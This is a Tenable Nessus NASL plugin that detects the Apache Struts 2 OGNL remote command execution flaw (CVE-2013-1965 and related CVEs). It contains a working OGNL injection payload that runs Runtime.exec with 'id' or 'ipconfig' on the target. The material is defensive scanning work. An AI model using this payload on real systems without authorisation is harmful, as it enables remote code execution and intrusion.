#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(66935);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2013-1965", "CVE-2013-1966", "CVE-2013-2115");
  script_bugtraq_id(60082, 60166, 60167);
  script_xref(name:"EDB-ID", value:"25980");

  script_name(english:"Apache Struts 2 Crafted Parameter Arbitrary OGNL Expression Remote Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework that is affected by a remote command execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web application appears to use Struts 2, a web framework
that utilizes OGNL (Object-Graph Navigation Language) as an expression
language. Due to a flaw in the evaluation of an OGNL expression, a
remote, unauthenticated attacker can exploit this issue to execute
arbitrary commands on the remote web server by sending a specially
crafted HTTP request. 

Note this issue exists because of an incomplete fix for CVE-2013-1966. 

Note that this version of Struts 2 is reportedly also affected by
multiple cross-site scripting (XSS) vulnerabilities as well as session
access and manipulation attacks; however, Nessus has not tested for
these issues. 

Note that this plugin will only report the first vulnerable instance
of a Struts 2 application.");
  # https://communities.coverity.com/blogs/security/2013/05/29/struts2-remote-code-execution-via-ognl-injection
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?51bd9543");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/s2-014.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.3.14.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2013-1965");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache-Struts Showcase < 2.3.14.1 RCE Linux");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts includeParams Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/05/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/05/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/06/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("http.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp /.do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = pregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = pregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = pregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
    if (cgi =~ "struts2?(-rest)?-showcase")
    {
      urls = make_list(urls, cgi);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

# Always check web root
urls = make_list(urls, "/");

# Struts is slow
timeout = get_read_timeout() * 2;
if(timeout < 10)
  timeout = 10;
http_set_read_timeout(timeout);

urls = list_uniq(urls);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig');

vuln = FALSE;

foreach url (urls)
{
  foreach cmd (cmds)
  {
    vuln_url = url + "/${%23context['xwork.MethodAccessor.denyMethod" +
      "Execution']=!(%23_memberAccess['allowStaticMethodAccess']=true)," +
      "(@java.lang.Runtime@getRuntime()).exec('" +cmd+ "').waitFor()}.action";

    res = http_send_recv3(
      method : "GET",
      port   : port,
      item   : vuln_url,
      fetch404     : TRUE,
      exit_on_fail : TRUE
    );

    if (
       res[0] =~ "404 Not Found" &&
       res[2] =~ "\<b\>message\</b\> \<u\>(.*)/(0)?\.jsp\</u\>"
    )
    {
      vuln = TRUE;
      break;
    }
  }
  # Stop after first vulnerable Struts app is found
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(build_url(qs:vuln_url, port:port)),
  output     : chomp(res[2])
);
